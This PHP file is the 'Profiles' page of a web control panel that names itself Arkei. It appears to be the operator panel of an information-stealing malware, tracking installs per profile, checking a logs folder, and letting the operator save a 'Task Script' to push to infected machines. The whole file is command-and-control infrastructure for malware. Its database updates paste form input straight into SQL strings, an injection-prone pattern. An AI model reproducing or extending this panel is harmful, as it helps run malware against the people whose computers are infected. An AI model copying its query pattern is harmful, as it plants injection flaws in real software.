<?php
/*
	Profiles
*/
session_start();
error_reporting(0);

require("app/config.php");

$action;

if($config["db_server"] == null)
{
	header('Location: http://'. $_SERVER["HTTP_HOST"] .'/install');
	exit(0);
}

if($_SESSION["auth"] != true)
{
	header( 'Location: http://'. $config["server_addr"] .'/auth', true, 301 );
	exit(0);
}

$database = mysqli_connect($config["db_server"], $config["db_user"], $config["db_password"], $config["db_name"]);

if($database)
{
	$profile_1_name = checkParam($_POST["profile_1_name"]);
	$profile_1_task = checkParam($_POST["profile_1_task"]);

	if($profile_1_name != null)
		$database->query("UPDATE `profiles` SET `Name`='$profile_1_name' WHERE `id`='1';");

	if($profile_1_task != null)
		$database->query("UPDATE `profiles` SET `task`='$profile_1_task' WHERE `id`='1';");

	$profile_2_name = checkParam($_POST["profile_2_name"]);
	$profile_2_task = checkParam($_POST["profile_2_task"]);

	if($profile_2_name != null)
		$database->query("UPDATE `profiles` SET `Name`='$profile_2_name' WHERE `id`='2';");

	if($profile_2_task != null)
		$database->query("UPDATE `profiles` SET `task`='$profile_2_task' WHERE `id`='2';");

	$profile_3_name = checkParam($_POST["profile_3_name"]);
	$profile_3_task = checkParam($_POST["profile_3_task"]);

	if($profile_3_name != null)
		$database->query("UPDATE `profiles` SET `Name`='$profile_3_name' WHERE `id`='3';");

	if($profile_3_task != null)
		$database->query("UPDATE `profiles` SET `task`='$profile_3_task' WHERE `id`='3';");

	$profile_4_name = checkParam($_POST["profile_4_name"]);
	$profile_4_task = checkParam($_POST["profile_4_task"]);

	if($profile_4_name != null)
		$database->query("UPDATE `profiles` SET `Name`='$profile_4_name' WHERE `id`='4';");

	if($profile_4_task != null)
		$database->query("UPDATE `profiles` SET `task`='$profile_4_task' WHERE `id`='4';");

	$profile_5_name = checkParam($_POST["profile_5_name"]);
	$profile_5_task = checkParam($_POST["profile_5_task"]);

	if($profile_5_name != null)
		$database->query("UPDATE `profiles` SET `Name`='$profile_5_name' WHERE `id`='5';");

	if($profile_5_task != null)
		$database->query("UPDATE `profiles` SET `task`='$profile_5_task' WHERE `id`='5';");

	$profile_6_name = checkParam($_POST["profile_6_name"]);
	$profile_6_task = checkParam($_POST["profile_6_task"]);

	if($profile_6_name != null)
		$database->query("UPDATE `profiles` SET `Name`='$profile_6_name' WHERE `id`='6';");

	if($profile_6_task != null)
		$database->query("UPDATE `profiles` SET `task`='$profile_6_task' WHERE `id`='6';");

	$profile_7_name = checkParam($_POST["profile_7_name"]);
	$profile_7_task = checkParam($_POST["profile_7_task"]);

	if($profile_7_name != null)
		$database->query("UPDATE `profiles` SET `Name`='$profile_7_name' WHERE `id`='7';");

	if($profile_7_task != null)
		$database->query("UPDATE `profiles` SET `task`='$profile_7_task' WHERE `id`='7';");

	$profile_8_name = checkParam($_POST["profile_8_name"]);
	$profile_8_task = checkParam($_POST["profile_8_task"]);

	if($profile_8_name != null)
		$database->query("UPDATE `profiles` SET `Name`='$profile_8_name' WHERE `id`='8';");

	if($profile_8_task != null)
		$database->query("UPDATE `profiles` SET `task`='$profile_8_task' WHERE `id`='8';");

	$profile_9_name = checkParam($_POST["profile_9_name"]);
	$profile_9_task = checkParam($_POST["profile_9_task"]);

	if($profile_9_name != null)
		$database->query("UPDATE `profiles` SET `Name`='$profile_9_name' WHERE `id`='9';");

	if($profile_9_task != null)
		$database->query("UPDATE `profiles` SET `task`='$profile_9_task' WHERE `id`='9';");

	$profile_10_name = checkParam($_POST["profile_10_name"]);
	$profile_10_task = checkParam($_POST["profile_10_task"]);

	if($profile_10_name != null)
		$database->query("UPDATE `profiles` SET `Name`='$profile_10_name' WHERE `id`='10';");

	if($profile_10_task != null)
		$database->query("UPDATE `profiles` SET `task`='$profile_10_task' WHERE `id`='10';");

	$profiles = $database->query("SELECT * FROM `profiles` ORDER BY `id`;");
}
else
{
	$action = "db_not_connected";
}


function checkParam($param)
{
	$formatted = $param;
	$formatted = trim($formatted);
	$formatted = stripslashes($formatted);
	$formatted = htmlspecialchars($formatted);
	
	return $formatted;
}

require("template/header.tmpl.php");

?>	
	<div class="container">
		<div class="row">
		<?
		
		switch($action)
		{
			case 'install_success':
			?>
			<div class="c-alert c-alert--success">
				<i class="c-alert__icon fa fa-check-circle"></i> Arkei successful installed! Please, delete install.php file.</div>
			<?
				break;
				
			case 'db_not_connected':
			?>
			<div class="c-alert c-alert--danger">
				<i class="c-alert__icon fa fa-check-circle"></i> Can't connect to MySQL database. Please, check app/config.php file</div>
			<?
				exit(0);
				break;
		}
		
		if($notice_install_file)
		{ ?>
			<div class="c-alert c-alert--danger">
				<i class="c-alert__icon fa fa-exclamation-triangle"></i> Please, delete install.php file in main directory!</div>
			<? } 
			
		if(!file_exists('server/'. $config["logs_folder"]))
		{ ?>
			<div class="c-alert c-alert--danger">
				<i class="c-alert__icon fa fa-exclamation-triangle"></i> Directory server/<? echo $config["logs_folder"] ?> does not exist!</div>
			<? } 
		
		?>
		
		<div class="col-md-12">
		<form id="profiles" action="/profiles" method="post">
                        <div class="c-card u-mb-large">
                            <div class="c-card__head">
                                <h3 class="c-card__title">Profiles <small>  <a href="/faq?type=tasks">How to use Tasks?</a></small></h3>
                            </div>

                            <table class="c-table">
                                <thead class="c-table__head c-table__head--slim">
                                    <tr class="c-table__row">
                                        <th class="c-table__cell c-table__cell--head">No.</th>
                                        <th class="c-table__cell c-table__cell--head">Name</th>
                                        <th class="c-table__cell c-table__cell--head">Installs</th>
                                        <th class="c-table__cell c-table__cell--head">Task Script</th>
                                    </tr>
                                </thead>

                                <tbody>
								
								<?
							
								while ($profile = $profiles->fetch_assoc())
								{
								?>
                                    <tr class="c-table__row">
                                        <td class="c-table__cell"><span class="u-text-mute"><? echo $profile["id"]; ?></span></td>
                                        <td class="c-table__cell">
											<div class="c-field">
												<input class="c-input" name="profile_<? echo $profile["id"]; ?>_name" type="text" value="<? echo $profile["Name"]; ?>">
											</div>
										</td>
                                        <td class="c-table__cell">
                                            <span class="u-text-mute"><? echo $profile["Count"]; ?> Installs</span>
                                        </td>
                                        <td class="c-table__cell">
                                            <span class="u-text-mute">
												<div class="c-field">
													<textarea class="c-input" name="profile_<? echo $profile["id"]; ?>_task"><? echo $profile["task"]; ?></textarea>
												</div>
											</span>
                                        </td>
                                    </tr>
									
								<? } ?>
                                </tbody>
                            </table>
                        </div>
						<div class="col u-mb-medium" style="width:200px; margin-right: 50%; margin-top: -30px;">
							<a onclick="document.getElementById('profiles').submit(); return false;" class="c-btn c-btn--success c-btn--fullwidth">Save</a>
						</div>
                    </div>
					

                    </div>
				</form>	
                </div>
            </div>
        </div>
		<script src="js/main.min.js?v=1.4"></script>
    </body>
</html>